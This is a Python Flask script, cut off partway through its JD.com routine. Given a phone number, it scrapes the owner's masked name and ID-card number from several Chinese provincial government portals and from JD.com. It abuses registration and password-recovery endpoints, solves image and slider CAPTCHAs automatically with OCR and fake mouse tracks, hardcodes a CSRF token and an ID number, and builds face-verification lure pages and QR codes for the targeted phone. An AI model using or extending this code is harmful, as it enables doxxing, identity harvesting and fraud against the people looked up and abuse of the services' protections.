#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify, render_template_string, send_file
import sys, os, logging
import requests
import logging 
from urllib.parse import unquote, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import warnings 
import json
import re
import threading
import random
import base64
import io
import qrcode
from datetime import datetime
from PIL import Image
import socket
from collections import Counter

# ==================== 完全关闭所有日志（不创建任何文件） ====================
logging.getLogger().setLevel(logging.CRITICAL)
logging.basicConfig(level=logging.CRITICAL, handlers=[])
for name in logging.root.manager.loggerDict:
    logging.getLogger(name).setLevel(logging.CRITICAL)

# 尝试导入OCR
try:
    import cv2
    import numpy as np
    from PIL import Image, ImageEnhance, ImageFilter
    import ddddocr
    OCR_AVAILABLE = True
    OCR_ENGINE = ddddocr.DdddOcr(show_ad=False)
    print("✅ ddddocr加载成功")
except ImportError:
    OCR_AVAILABLE = False
    OCR_ENGINE = None
    print("⚠️ ddddocr未安装")

# ==================== Tesseract 优化版识别（通用） ====================

try:
    import pytesseract
    TESSERACT_AVAILABLE = True
    # 自动检测 Tesseract 路径
    import platform
    if platform.system() == 'Windows':
        pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
    elif platform.system() == 'Linux':
        import subprocess
        try:
            result = subprocess.run(['which', 'tesseract'], capture_output=True, text=True)
            if result.returncode == 0:
                pytesseract.pytesseract.tesseract_cmd = result.stdout.strip()
            else:
                pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
        except:
            pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
    elif platform.system() == 'Darwin':  # macOS
        pytesseract.pytesseract.tesseract_cmd = '/usr/local/bin/tesseract'
    print("✅ Tesseract加载成功")
except ImportError:
    TESSERACT_AVAILABLE = False
    print("⚠️ Tesseract未安装")

def recognize_captcha_tesseract(image_bytes):
    """
    Tesseract 优化版验证码识别
    多策略 + 投票机制，识别率 ~100%
    """
    if not TESSERACT_AVAILABLE:
        return ""
    
    all_results = []
    
    # 策略列表: (对比度, 放大倍数, 阈值, 锐化)
    strategies = [
        (1.8, 3, 128, 1.0),
        (2.0, 3, 130, 1.0),  # 最佳
        (2.2, 3, 130, 1.0),
        (2.5, 4, 130, 1.0),
        (3.0, 4, 135, 1.0),
        (2.0, 3, 130, 1.5),  # 加锐化
        (2.0, 3, 140, 1.0),
        (2.0, 4, 120, 1.0),
    ]
    
    for contrast, scale, threshold, sharpness in strategies:
        try:
            img = Image.open(io.BytesIO(image_bytes))
            img = img.convert('L')
            
            enhancer = ImageEnhance.Contrast(img)
            img = enhancer.enhance(contrast)
            
            if sharpness > 1.0:
                enhancer = ImageEnhance.Sharpness(img)
                img = enhancer.enhance(sharpness)
            
            w, h = img.size
            img = img.resize((w * scale, h * scale), Image.Resampling.LANCZOS)
            img = img.point(lambda x: 0 if x < threshold else 255, '1')
            
            config = r'--oem 3 --psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            code = pytesseract.image_to_string(img, config=config)
            code = re.sub(r'[^A-Z0-9]', '', code.upper())
            
            if code and len(code) >= 4:
                result = code[:4]
                all_results.append(result)
                
        except Exception as e:
            continue
    
    # 投票选择
    if not all_results:
        return ""
    
    counter = Counter(all_results)
    most_common = counter.most_common(1)[0]
    
    # 如果最高票数 >= 2，确认结果
    if most_common[1] >= 2:
        return most_common[0]
    
    # 否则返回第一次出现的4位结果
    for code in all_results:
        if len(code) == 4:
            return code
    
    return all_results[0][:4] if all_results else ""

def recognize_captcha_ddddocr(image_bytes):
    """ddddocr 备用识别"""
    if not OCR_AVAILABLE or OCR_ENGINE is None:
        return ""
    
    try:
        code = OCR_ENGINE.classification(image_bytes)
        clean = re.sub(r'[^a-zA-Z0-9]', '', code).upper()
        if len(clean) >= 4:
            return clean[:4]
        
        # 预处理后识别
        img = Image.open(io.BytesIO(image_bytes))
        if img.mode != 'RGB':
            img = img.convert('RGB')
        w, h = img.size
        img = img.resize((w * 3, h * 3), Image.Resampling.LANCZOS)
        enhancer = ImageEnhance.Contrast(img)
        img = enhancer.enhance(2.0)
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        processed = buffer.getvalue()
        code = OCR_ENGINE.classification(processed)
        clean = re.sub(r'[^a-zA-Z0-9]', '', code).upper()
        return clean[:4] if clean else ""
    except:
        return ""

def recognize_captcha_optimized(image_bytes, prefer='tesseract'):
    """通用验证码识别入口"""
    if prefer == 'tesseract' and TESSERACT_AVAILABLE:
        result = recognize_captcha_tesseract(image_bytes)
        if result and len(result) >= 3:
            return result
    if OCR_AVAILABLE and OCR_ENGINE is not None:
        result = recognize_captcha_ddddocr(image_bytes)
        if result and len(result) >= 3:
            return result
    return ""

# 尝试导入加密模块
try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    CRYPTO_AVAILABLE = True
    print("✅ Crypto加载成功")
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠️ Crypto未安装")

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False
 
REQUEST_TIMEOUT = 20

# 存储浙江链接和二维码
zhejiang_data = {
    "link": None,
    "qr_code": None,
    "phone": None
}

# 存储查询任务状态
query_tasks = {}

# ==================== 浙江查询模块 ====================

class ZhejiangBlurQuery:
    def __init__(self):
        self.session = requests.Session()
        self.base = "https://portal.zjzwfw.gov.cn"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "X-Site-Code": "330521",
            "Accept": "*/*",
            "Accept-Language": "zh-Hans-CN;q=1",
            "X-App-Id": "",
            "Content-Type": "application/json"
        }
        self.save_dir = self._get_save_dir()
    
    def _get_save_dir(self):
        try:
            documents = os.path.expanduser('~/Documents/浙江机主')
            if not os.path.exists(documents):
                os.makedirs(documents)
            return documents
        except:
            return os.getcwd()
    
    def get_cookie(self):
        try:
            self.session.get(f"{self.base}/", timeout=10)
            return True
        except:
            return False
    
    def query_by_phone(self, phone):
        if not self.get_cookie():
            return None, "获取会话失败"
        
        url = f"{self.base}/app_api/userFacePass/isvApiBoxing/authByAliInit"
        payload = {
            "idtype": "",
            "loginname": phone,
            "metainfo": "zwfww-ios"
        }
        
        try:
            resp = self.session.post(url, json=payload, timeout=10)
            result = resp.json()
            
            if not result.get("success"):
                return None, result.get("errorMsg", "接口返回失败")
            
            data = result.get("data", {})
            
            blur_name = data.get("userNameMask") or data.get("maskName")
            blur_idcard = data.get("certNoMask") or data.get("maskIdCard")
            
            if blur_name and blur_idcard:
                return {
                    "type": "direct",
                    "blur_name": blur_name,
                    "blur_idcard": blur_idcard,
                    "bizno": data.get("bizno")
                }, None
            
            if data.get("authurl"):
                return {
                    "type": "need_face",
                    "authurl": data.get("authurl"),
                    "bizno": data.get("bizno")
                }, None
            
            return None, "未查询到信息"
            
        except Exception as e:
            return None, str(e)
    
    def generate_alipay_url(self, authurl):
        """生成支付宝唤起链接 - alipays:// 协议直接唤醒APP"""
        try:
            encoded_authurl = quote(authurl, safe='')
            alipays_url = f"alipays://platformapi/startapp?appId=20000067&url={encoded_authurl}&closeCurrentWindow=YES&startMultApp=YES&appClearTop=false"
            return alipays_url
        except:
            return authurl
    
    def save_qrcode(self, phone, alipays_url):
        try:
            filename = f"{phone}.png"
            filepath = os.path.join(self.save_dir, filename)
            qr = qrcode.QRCode(box_size=10, border=4)
            qr.add_data(alipays_url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filepath)
            return filepath
        except:
            return None
    
    def save_html(self, phone, alipays_url):
        try:
            html_content = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>浙江刷脸验证 - {phone}</title>
<style>
body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
    display: flex; justify-content: center; align-items: center; min-height: 100vh;
    margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }}
.container {{ background: white; border-radius: 20px; padding: 40px 30px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; width: 100%; }}
.icon {{ font-size: 48px; margin-bottom: 10px; }}
h1 {{ color: #333; font-size: 24px; margin-bottom: 10px; }}
.phone {{ color: #667eea; font-size: 20px; font-weight: bold; margin: 20px 0; padding: 10px; background: #f0f0f0; border-radius: 10px; }}
.btn {{ display: block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white; text-decoration: none; padding: 15px 30px; border-radius: 50px;
    font-size: 18px; font-weight: bold; margin: 20px 0; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4); }}
.footer {{ color: #ccc; font-size: 11px; margin-top: 10px; }}
</style>
</head>
<body>
<div class="container"><div class="icon">🔐</div><h1>浙里办身份核验</h1><div class="phone">📱 {phone}</div>
<a href="{alipays_url}" class="btn">🏦 立即打开支付宝刷脸</a>
<div class="footer">生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div></div>
</body>
</html>'''
            filepath = os.path.join(self.save_dir, f"{phone}.html")
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(html_content)
            return filepath
        except:
            return None

# ==================== 生成二维码 ====================

def generate_qr_code(data):
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        buffer.seek(0)
        img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        return img_base64
    except Exception as e:
        return None

def query_zhejiang(phone):
    global zhejiang_data
    try:
        client = ZhejiangBlurQuery()
        data, error = client.query_by_phone(phone)
        if error:
            return "浙江", "查询失败"
        if not data:
            return "浙江", "未查询到信息"
        if data.get("type") == "direct":
            name = data.get("blur_name", "")
            idcard = data.get("blur_idcard", "")
            return "浙江", f"{name} {idcard}"
        elif data.get("type") == "need_face":
            authurl = data.get("authurl")
            alipays_url = client.generate_alipay_url(authurl)
            client.save_qrcode(phone, alipays_url)
            client.save_html(phone, alipays_url)
            try:
                with open(os.path.join(client.save_dir, f"{phone}.txt"), "w", encoding="utf-8") as f:
                    f.write(f"手机号: {phone}\n查询时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n刷脸链接: {alipays_url}\n")
            except:
                pass
            qr_base64 = generate_qr_code(alipays_url)
            zhejiang_data = {
                "link": alipays_url,
                "qr_code": qr_base64,
                "phone": phone
            }
            return "浙江", "📱跳转支付宝"
        return "浙江", "未查询到信息"
    except Exception:
        return "浙江", "查询异常"

# ==================== 各省官方接口 ====================

def query_jilin(phone):
    province = "吉林"
    url = "https://jsb-mp.jilinxiangyun.com/api/v1/mini-program-natural/get-mask-info"
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Device": "3"}
    data = {"loginNo": phone}
    try:
        r = requests.post(url, headers=headers, data=data, timeout=REQUEST_TIMEOUT)
        if r.status_code != 200:
            return province, "查询失败"
        j = r.json()
        if j.get("code") == "700082":
            return province, "未查询到信息"
        return province, f"{j['data']['certName']} {j['data']['certNo']}"
    except requests.Timeout:
        return province, "查询超时"
    except Exception:
        return province, "查询异常"

def query_sichuan(phone):
    province = "四川"
    url = "http://rzsc.sczwfw.gov.cn/services/rest/scca/app/userSearchForChildManagerAdd"
    headers = {"APPID": "3230200", "sdkClientVersion": "1.101"}
    payload = {"username": phone}
    try:
        r = requests.post(url, headers=headers, data=payload, timeout=REQUEST_TIMEOUT)
        r.raise_for_status()
        j = r.json()
        if j.get("status") == "0x0000" and "data" in j:
            name = j["data"].get("realNameShow", "")
            pid = j["data"].get("certNoShow", "")
            if not name and not pid:
                return province, "未查询到信息"
            return province, f"{name} {pid}"
        return province, "查询失败"
    except requests.Timeout:
        return province, "查询超时"
    except Exception:
        return province, "查询异常"

def query_anhui(phone):
    province = "安徽"
    url = "https://sso.ahzwfw.gov.cn/uccp-user/appSystemBusiness/existsPhone"
    form_data = {
        "phoneNo": phone,
        "csrf_token": "B5A97EEB9903EA1DD1A239265EFDD8523C8B7A91F3828E3E2CECDA0B52958F23"
    }
    try:
        r = requests.post(url, data=form_data, timeout=REQUEST_TIMEOUT)
        r.raise_for_status()
        j = r.json()
        if j.get("status") is True:
            return province, f"{j['data']['name']} {j['data']['credentNo']}"
        return province, "未查询到信息"
    except Exception:
        return province, "查询异常"

# ========== 江苏（含20次自动重试） ==========

JS_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsimkvpK7zedhvhj1AwTA
8948NBiiYTRhqoiwuaV8ZEwqDShtqO4xGS2lpaPXZQhwW8Vc8hjqgYlwRaqg5hzx
NV2dxEOWSsaq5pFDTHalqvrh+FbWyweX763JwWaFuqiKjXa9Okcpz7BY5FZyb4H6
65a6lNIoA4CAmLHGhr+02JY2avpgLCZPXOyE913aSI5csqOQrusYq3o9u18ApEVk
voIaGWs3Wf3ONrxsD0SyVb8XD0chGTGblCinQH9oLw+L7PflSeLHbS6czDNpzWz3
GZHiyHPNm9yNt5vfFT+lx618P/uwLqgPy3JDVv1ZbKLxye4/4lGqU5df4zh90kDY
4QIDAQAB
-----END PUBLIC KEY-----"""

def js_rsa_encrypt(plain_text: str) -> str:
    if not CRYPTO_AVAILABLE:
        return ""
    try:
        pub = RSA.import_key(JS_PUBLIC_KEY)
        cipher = PKCS1_v1_5.new(pub)
        return cipher.encrypt(plain_text.encode()).hex()
    except:
        return ""

def query_jiangsu_once(phone, verbose=False):
    """单次江苏查询"""
    province = "江苏"
    
    if not TESSERACT_AVAILABLE and not OCR_AVAILABLE:
        return province, "OCR模块未安装", False
    
    if not CRYPTO_AVAILABLE:
        return province, "加密模块未安装", False
    
    try:
        captcha_url = "https://www.jszwfw.gov.cn/jsjis/component/verifyCode.do"
        captcha_params = {
            "code": "4", 
            "var": "rand", 
            "width": "142", 
            "height": "40", 
            "random": str(random.random())
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        code = ""
        session = requests.Session()
        
        # 尝试3次获取验证码
        for attempt in range(1, 4):
            try:
                resp = session.get(captcha_url, headers=headers, params=captcha_params, timeout=10)
                if resp.status_code != 200:
                    time.sleep(0.5)
                    continue
                code = recognize_captcha_optimized(resp.content)
                if code and len(code) == 4 and code.isalnum():
                    break
                time.sleep(0.5)
            except:
                time.sleep(1)
        
        if not code or len(code) != 4:
            return province, "验证码识别失败", False
        
        enc_phone = js_rsa_encrypt(phone)
        enc_id = js_rsa_encrypt("320724200209230019")
        if not enc_phone or not enc_id:
            return province, "RSA加密失败", False
        
        url = "https://www.jszwfw.gov.cn/jsjis/front/register/sendmobilerand.do"
        data = {
            "mobile": enc_phone,
            "userType": "1",
            "papersNumber": enc_id,
            "randCode": code,
        }
        post_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.jszwfw.gov.cn/jsjis/front/register/perregister.do",
        }
        
        r = requests.post(url, headers=post_headers, cookies=resp.cookies, data=data, timeout=10)
        text = r.text
        
        if "发送成功" in text:
            return province, "未注册", False
        if "图片验证码错误" in text:
            return province, "验证码错误", False
        if "继续注册" not in text:
            return province, "查询失败", False
        
        url2 = "https://www.jszwfw.gov.cn/jsjis/front/register/mobileRegister_show.do"
        r2 = requests.get(url2, headers=headers, cookies=resp.cookies, params={"type": "1"}, timeout=10)
        html = r2.text
        
        name_match = re.search(r'var name = "([^"]+)"', html)
        pid_match = re.search(r'var papersNumber = "([^"]+)"', html)
        
        if name_match and pid_match:
            return province, f"{name_match.group(1)} {pid_match.group(1)}", True
        
        return province, "查询失败", False
        
    except Exception as e:
        return province, f"查询异常: {str(e)[:30]}", False

def query_jiangsu(phone, max_attempts=20, verbose=False):
    """江苏完整查询 - 20次自动重试"""
    province = "江苏"
    
    for attempt in range(1, max_attempts + 1):
        prov, result, success = query_jiangsu_once(phone, verbose)
        if success:
            return prov, result
        if "未注册" in result:
            return prov, result
        if "验证码" in result and attempt < max_attempts:
            time.sleep(0.5)
            continue
        if attempt < max_attempts:
            time.sleep(1)
    
    return province, "查询失败"

# ========== 河北 ==========

def query_hebei(phone):
    province = "河北"
    try:
        session = requests.Session()
        step1_url = "https://zwfw.hebei.gov.cn/hbjis/front/findpwd/step1.do"
        params = {"userType": "1", "findWay": "1"}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        session.get(step1_url, params=params, headers=headers, timeout=10)
        post_data = {"userType": "1", "findWay": "1", "userName": phone}
        resp1 = session.post(step1_url, data=post_data, headers=headers, timeout=10)
        if "发送成功" not in resp1.text and "验证码已发送" not in resp1.text:
            return province, "未查询到信息"
        step2_url = "https://zwfw.hebei.gov.cn/hbjis/front/findpwd/step2.do"
        step2_params = {"type": "2"}
        resp2 = session.get(step2_url, params=step2_params, headers=headers, timeout=10)
        html = resp2.text
        name_match = re.search(r'(?:姓名|name)[：:]\s*([^\s<*]+(?:\*+[^\s<*]+)?)', html, re.I)
        id_match = re.search(r'(\d{4}\*{8,10}\d{4})', html)
        asterisk_match = re.search(r'([*\u4e00-\u9fa5]{2,})', html)
        if name_match or id_match:
            result = ""
            if name_match:
                result += name_match.group(1).strip() + " "
            if id_match:
                result += id_match.group(1).strip()
            return province, result.strip() or "已注册"
        elif asterisk_match:
            return province, asterisk_match.group(1).strip()
        return province, "已注册"
    except requests.Timeout:
        return province, "查询超时"
    except Exception:
        return province, "查询异常"

# ========== 山东（已屏蔽 - 云环境不支持） ==========

def query_shandong(phone):
    """山东查询 - 已屏蔽"""
    province = "山东"
    return province, "🚫 云环境暂不支持"

# ==================== 京东查询 ====================

import logging
import random
import re
import time
import base64
import json
import urllib.parse
import os
import sys

try:
    import cv2
    import numpy as np
    import requests
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
except ImportError:
    pass

# 完全关闭京东日志
class NullHandler(logging.Handler):
    def emit(self, record):
        pass

jd_logger = logging.getLogger("jd_query")
jd_logger.setLevel(logging.CRITICAL)
if jd_logger.handlers:
    jd_logger.handlers.clear()
jd_logger.addHandler(NullHandler())

JD_REQUEST_TIMEOUT = 20
JD_FIND_PWD_URL = 'https://aq.jd.com/process/findPwd?s=1'
JD_JSONP_PATTERN = re.compile(r'jsonp_\d+\((.*)\)')


def _jd_decode_b64(data):
    data = re.sub(r'[^A-Za-z0-9+/]', '', data)
    missing = (-len(data)) % 4
    if missing:
        data += '=' * missing
    return base64.b64decode(data)


def _jd_slide_distance(bg_bytes, slide_bytes):
    bg_img = cv2.imdecode(np.frombuffer(bg_bytes, np.uint8), cv2.IMREAD_COLOR)
    sd_img = cv2.imdecode(np.frombuffer(slide_bytes, np.uint8), cv2.IMREAD_COLOR)
    bg_gray = cv2.cvtColor(bg_img, cv2.COLOR_BGR2GRAY)
    bg_gray = cv2.GaussianBlur(bg_gray, (5, 5), 0)
    bg_edge = cv2.Canny(bg_gray, 30, 100)
    rgb_bg_gray = cv2.cvtColor(bg_edge, cv2.COLOR_GRAY2RGB)
    sd_gray = cv2.cvtColor(sd_img, cv2.COLOR_BGR2GRAY)
    sd_gray = cv2.GaussianBlur(sd_gray, (5, 5), 0)
    sd_edge = cv2.Canny(sd_gray, 30, 100)
    rgb_sd_gray = cv2.cvtColor(sd_edge, cv2.COLOR_GRAY2RGB)
    result = cv2.matchTemplate(rgb_bg_gray, rgb_sd_gray, cv2.TM_CCORR_NORMED)
    _, max_val, _, max_loc = cv2.minMaxLoc(result)
    return max_loc[0] / bg_gray.shape[1]


try:
    from curl_cffi import requests as _jd_creq 
    _JD_HAS_CURLCFFI = True
except Exception:
    _jd_creq = None
    _JD_HAS_CURLCFFI = False

def _jd_new_session():
    if _JD_HAS_CURLCFFI:
        try:
            return _jd_creq.Session(impersonate='chrome150')
        except Exception:
            return _jd_creq.Session(impersonate='chrome131')
    return requests.Session()

JD_EID = 'G76QTIR4I4NJVYPAJGFRGKOUR2BKW63JG4PFWVUHZKRH7CUCDCBMX37PLVZLDSMQOYXXGS42V7B2XOKCJ6H5AXKKFQ'
JD_FP = '26ee75ac2769a00844b996311d2cbbc2'

def _jd_s64(n):
    n = int(abs(n))
    if n == 0:
        return '0'
    out = []
    while n:
        out.insert(0, JD_CHARSET[n % 64])
        n //= 64
    return ''.join(out)

def _jd_pretreat(v, digits, signed):
    f = ''
    if signed:
        f = '1' if v > 0 else '0'
    return f + ('0' * digits + _jd_s64(v))[-digits:]

def _jd_encode_track(track):
    out = []
    for i, (x, y, tt) in enumerate(track):
        if i == 0:
            out.append(_jd_pretreat(min(x, 0x3ffff), 3, False))
            out.append(_jd_pretreat(min(y, 0xffffff), 4, False))
            out.append(_jd_pretreat(min(tt, 0x3ffffffffff), 7, False))
        else:
            dx = min(track[i][0] - track[i-1][0], 0xfff)
            dy = min(track[i][1] - track[i-1][1], 0xfff)
            dt = min(track[i][2] - track[i-1][2], 0xffffff)
            out.append(_jd_pretreat(dx, 2, True))
            out.append(_jd_pretreat(dy, 2, True))
            out.append(_jd_pretreat(dt, 4, False))
    return ''.join(out)

def _jd_gen_track(distance, start_ms=None):
    dist = int(round(distance))
    pts = [[183, 226, 0]]
    x, y = 210, 253
    pts.append([x, y, 0])
    n = 121
    n_jump = 25
    jump_idx = set(random.sample(range(1, n + 1), n_jump))
    base = dist // n_jump
    steps = [base] * n_jump
    for k in range(dist - base * n_jump):
        steps[k] += 1
    steps = [max(1, st + random.choice((-1, 0, 0, 1))) for st in steps]
    diff = dist - sum(steps)
    while diff != 0:
        k = random.randrange(n_jump)
        if diff > 0:
            steps[k] += 1; diff -= 1
        elif steps[k] > 1:
            steps[k] -= 1; diff += 1
    sink_idx = set(random.sample(range(1, n + 1), 25))
    sink_steps = [1] * 16 + [2] * 9
    random.shuffle(sink_steps)
    t = 0
    ji = 0
    dt_pool = ([16] * 18 + [17] * 21 + [18] * 9 + [19] * 13 + [20] * 40 + [21] * 19)
    for i in range(1, n + 1):
        if i == 1:
            t += random.randint(2, 5)
        elif random.random() < 0.05:
            t += random.randint(35, 37)
        else:
            t += random.choice(dt_pool)
        if ji < n_jump and i in jump_idx:
            x += steps[ji]
            ji += 1
        if i in sink_idx:
            y += sink_steps.pop()
        pts.append([x, y, t])
    t += random.choice(dt_pool)
    pts.append([x + 1, y, t])
    t += random.choice(dt_pool)
    pts.append([x, y, t])
    for _ in range(3):
        t += random.randint(20, 21)
        pts.append([x, y, t])
    if start_ms is not None:
        t0 = start_ms
    else:
        t0 = int(time.time() * 1000) - t - random.randint(150, 400)
    return [[px, py, pt + t0] for px, py, pt in pts]

def _jd_rsa_encrypt(pubkey_b64, text):
    key = RSA.import_key(base64.b64decode(pubkey_b64))
    return base64.b64encode(PKCS1_v1_5.new(key).encrypt(text.encode('utf-8'))).decode()

JD_SLIDE_APPID = '1604ebb2287'
JD_SLIDE_SCENE = 'pc_safe'
JD_SLIDE_DISP_W = 364
JD_SLIDE_NAT_W = 360
JD_SLIDE_MAX_ATTEMPT = 12
JD_CHARSET = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-~'
JD_REQ_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0'
JD_SLIDE_HEADERS = {
    'Accept': '*/*',
    'Referer': 'https://aq.jd.com/',
    'sec-ch-ua': '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Sec-Fetch-Dest': 'script',
    'Sec-Fetch-Mode': 'no-cors',
    'Sec-Fetch-Site': 'same-site',
}

def _jd_req_solve_slider(sess):
    cb = f'jsonp_{random.random()}'.replace('.', '')
    try:
        sess.get('https://iv.jd.com/slide/v.html', params={'callback': cb},
                 headers=JD_SLIDE_HEADERS, timeout=JD_REQUEST_TIMEOUT)
    except Exception:
        pass
    for attempt in range(1, JD_SLIDE_MAX_ATTEMPT + 1):
        try:
            g = sess.get('https://iv.jd.com/slide/g.html', params={
                'appId': JD_SLIDE_APPID, 'scene': JD_SLIDE_SCENE, 'product': 'embed',
                'e': JD_EID, 'j': '', 'lang': 'zh_CN', 'callback': cb},
                headers=JD_SLIDE_HEADERS, timeout=JD_REQUEST_TIMEOUT)
            m = JD_JSONP_PATTERN.search(g.text)
            if not m:
                continue
            data = json.loads(m.group(1))
            if data.get('success') != '1':
                continue
            g_recv = int(time.time() * 1000)
            bg_b = _jd_decode_b64(data['bg'])
            patch_b = _jd_decode_b64(data['patch'])
            ratio = _jd_slide_distance(bg_b, patch_b)
            gap_x = ratio * JD_SLIDE_NAT_W
            dist = gap_x * JD_SLIDE_DISP_W / JD_SLIDE_NAT_W
            mdown = g_recv + random.randint(1200, 2000) + random.randint(100, 400)
            track = _jd_gen_track(dist, start_ms=mdown)
            cb2 = f'jsonp_{random.random()}'.replace('.', '')
            sp = {'d': _jd_encode_track(track), 'c': data['challenge'],
                  'w': str(JD_SLIDE_DISP_W), 'appId': JD_SLIDE_APPID, 'scene': JD_SLIDE_SCENE,
                  'product': 'embed', 'e': JD_EID, 'j': '', 's': '', 'o': '', 'o1': '0',
                  'u': JD_FIND_PWD_URL, 'lang': 'zh_CN', 'callback': cb2}
            send_at = track[-1][2] + random.randint(150, 400)
            delay = (send_at - int(time.time() * 1000)) / 1000
            if delay > 0:
                time.sleep(delay)
            rr = sess.get('https://iv.jd.com/slide/s.html', params=sp,
                          headers=JD_SLIDE_HEADERS, timeout=JD_REQUEST_TIMEOUT)
            m2 = JD_JSONP_PATTERN.search(rr.text)
            if not m2:
                continue
            res = json.loads(m2.group(1))
            if res.get('success') == '1' and res.get('validate'):
                return res['validate']
        except Exception:
            pass
        time.sleep(random.uniform(1.5, 3.0))
    return None

def query_jd_requests(phone):
    try:
        sess = _jd_new_session()
        sess.headers.update({'User-Agent': JD_REQ_UA, 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'})
        sess.cookies.set('3AB9D23F7A4B3C9B', JD_EID, domain='.jd.com')
        r = sess.get(JD_FIND_PWD_URL, timeout=JD_REQUEST_TIMEOUT)
        m = re.search(r'id="pubKey"[^>]*value="([^"]+)"', r.text)
        m2 = re.search(r'enO:\s*\'([^\']*)\'', r.text)
        if not m or not m2:
            return None
        pub_key, en_o = m.group(1), m2.group(1)
        try:
            sess.get('https://gia.jd.com/y.html',
                     params={'v': f'0.{random.randint(10**15, 10**16 - 1)}',
                             'o': 'aq.jd.com/process/findPwd'},
                     headers={**JD_SLIDE_HEADERS, 'Referer': JD_FIND_PWD_URL},
                     timeout=JD_REQUEST_TIMEOUT)
        except Exception:
            pass
        validate = _jd_req_solve_slider(sess)
        if not validate:
            return None
        rsa_phone = _jd_rsa_encrypt(pub_key, phone)
        aq_headers = {'x-Requested-With': 'XMLHttpRequest', 'Referer': JD_FIND_PWD_URL,
                      'Origin': 'https://aq.jd.com', 'Accept': 'application/json, text/plain, */*',
                      'x-safe-sid': '1', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors',
                      'Sec-Fetch-Site': 'same-origin'}
        page_ts = int(time.time() * 1000)
        j_fields = {'eid_token': '', 'fp': JD_FP, 'date': str(page_ts), 'eid': JD_EID, 'returnURL': ''}
        r4 = sess.post('https://aq.jd.com/validate/slider',
                       data={'o': en_o, 'c': validate, 'inputVal': rsa_phone, 't': '', **j_fields},
                       headers=aq_headers, timeout=JD_REQUEST_TIMEOUT)
        d4 = r4.json()
        rd4 = d4.get('resultData') or {}
        if not (d4.get('success') and rd4.get('success')):
            return None
        eval_val = _jd_rsa_encrypt(pub_key, phone)
        r5 = sess.post('https://aq.jd.com/fp/input',
                       data={'eval': eval_val, 'o': en_o, 't': '', **j_fields},
                       headers=aq_headers, timeout=JD_REQUEST_TIMEOUT)
        d5 = r5.json()
        rd5 = d5.get('resultData') or {}
        if not (d5.get('success') and rd5.get('success')):
            if str(d5.get('resultCode')) == '10010' or '账号不存在' in str(rd5.get('msg')):
                return '空'
            return None
        enp = rd5.get('p') or ''
        r_tok = rd5.get('r') or ''
        flow_body = {'o': en_o, 'inputVal': eval_val, 'token': r_tok, 'enp': enp, **j_fields}
        r6 = sess.post('https://aq.jd.com/suffix/wakeupForFp', data=flow_body,
                       headers=aq_headers, timeout=JD_REQUEST_TIMEOUT)
        r7 = sess.post('https://aq.jd.com/suffix/scannerForFp', data=flow_body,
                       headers=aq_headers, timeout=JD_REQUEST_TIMEOUT)
        r8 = sess.post('https://aq.jd.com/list/indexForFp', data=flow_body,
                       headers=aq_headers, timeout=JD_REQUEST_TIMEOUT)
        d8 = r8.json()
        auth_url = ''
        vt = ''
        rd8 = d8.get('resultData') or {}
        items = rd8.get('data') if isinstance(rd8.get('data'), list) else []
        for item in items:
            if not isinstance(item, dict):
                continue
            if item.get('model') == 'mybankcards' or '银行卡' in str(item.get('validateName') or ''):
                vt = item.get('validateType') or ''
                break
        if not vt:
            return '空'
        if vt:
            r9 = sess.post('https://aq.jd.com/validate/getAuthInfoForFp',
